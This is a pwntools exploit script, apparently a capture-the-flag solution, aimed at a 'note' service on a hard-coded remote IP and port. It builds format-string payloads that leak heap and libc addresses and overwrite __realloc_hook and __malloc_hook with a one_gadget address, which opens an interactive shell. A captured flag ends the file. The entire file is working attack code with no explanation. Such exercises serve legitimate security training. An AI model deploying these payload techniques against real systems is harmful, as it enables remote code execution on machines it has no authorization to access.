from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('note')
io = remote('47.104.70.90', 25315)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('note')
one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]


def add(size, content):
    io.sendlineafter('choice: ', '1')
    io.sendlineafter('size: ', str(size))
    io.sendafter('content: ', content)
    io.recvuntil('addr: ')
    return int(io.recvline()[:-1], 16)


def say(fmt, content):
    io.sendlineafter('choice: ', '2')
    io.sendafter('say ? ', fmt)
    io.sendafter('? ', content)


def show():
    io.sendlineafter('choice: ', '3')
    io.recvuntil('content:')
    return io.recvline()[:-1]


def leak():
    global heap_base, libc_base
    heap_base = add(0x100, 'aaaa') - 0x10
    log.success('heap_base: ' + hex(heap_base))
    
    io.sendlineafter('choice: ', '2')
    payload = b'%14c%8$hnaaaaaaa' + p64(heap_base + 0x119)
    io.sendafter('say ? ', payload)
    io.sendlineafter('? ', 'a' * 13)
    
    for _ in range(0xe):
        add(0xf8, 'aaaa')
    add(0xf8, 'aaaa')
    add(0xc8, 'aaaaaaaa')
    libc_base = u64(show()[8:].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __malloc_hook = libc_base + libc.sym['__malloc_hook']
    __realloc_hook = libc_base + libc.sym['__realloc_hook']
    realloc = libc_base + libc.sym['realloc']
    one_gadget = libc_base + one_gadgets[3]

    io.sendlineafter('choice: ', '2')
    payload = b''
    cur_num = 0
    padding_num = []
    for i in range(3):
        target_num = (one_gadget >> (i * 8)) & 0xff
        if target_num > cur_num:
            padding_num.append(target_num - cur_num)
        else:
            padding_num.append(0x100 + target_num - cur_num)
        cur_num = target_num
    for i in range(3):
        payload += b'%1$' + str.encode(str(padding_num[i])) + b'c'
        payload += b'%' + str.encode(str(12 +i)) + b'$hhn'
    payload = payload.ljust(0x30, b'a')
    for i in range(3):
        payload += p64(__realloc_hook + i)
    io.sendafter('say ? ', payload)
    for i in range(3):
        io.sendline('a' * (padding_num[i] - 1))
    
    io.sendlineafter('choice: ', '2')
    payload = b''
    cur_num = 0
    padding_num = []
    for i in range(3, 6):
        target_num = (one_gadget >> (i * 8)) & 0xff
        if target_num > cur_num:
            padding_num.append(target_num - cur_num)
        else:
            padding_num.append(0x100 + target_num - cur_num)
        cur_num = target_num
    for i in range(3):
        payload += b'%1$' + str.encode(str(padding_num[i])) + b'c'
        payload += b'%' + str.encode(str(12 +i)) + b'$hhn'
    payload = payload.ljust(0x30, b'a')
    for i in range(3, 6):
        payload += p64(__realloc_hook + i)
    io.sendafter('say ? ', payload)
    for i in range(3):
        io.sendline('a' * (padding_num[i] - 1))

    io.sendlineafter('choice: ', '2')
    payload = b''
    cur_num = 0
    padding_num = []
    for i in range(3):
        target_num = ((realloc + 20) >> (i * 8)) & 0xff
        if target_num > cur_num:
            padding_num.append(target_num - cur_num)
        else:
            padding_num.append(0x100 + target_num - cur_num)
        cur_num = target_num
    for i in range(3):
        payload += b'%1$' + str.encode(str(padding_num[i])) + b'c'
        payload += b'%' + str.encode(str(12 +i)) + b'$hhn'
    payload = payload.ljust(0x30, b'a')
    for i in range(3):
        payload += p64(__malloc_hook + i)
    io.sendafter('say ? ', payload)
    for i in range(3):
        io.sendline('a' * (padding_num[i] - 1))
    
    io.sendlineafter('choice: ', '2')
    payload = b''
    cur_num = 0
    padding_num = []
    for i in range(3, 6):
        target_num = (realloc >> (i * 8)) & 0xff
        if target_num > cur_num:
            padding_num.append(target_num - cur_num)
        else:
            padding_num.append(0x100 + target_num - cur_num)
        cur_num = target_num
    for i in range(3):
        payload += b'%1$' + str.encode(str(padding_num[i])) + b'c'
        payload += b'%' + str.encode(str(12 +i)) + b'$hhn'
    payload = payload.ljust(0x30, b'a')
    for i in range(3, 6):
        payload += p64(__malloc_hook + i)
    io.sendafter('say ? ', payload)
    for i in range(3):
        io.sendline('a' * (padding_num[i] - 1))

    # gdb.attach(io)
    io.sendlineafter('choice: ', '1')
    io.sendlineafter('size: ', '1')
    # pause()
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
# flag{006c45fa-81d5-45eb-8f8c-eb6833daadf5}
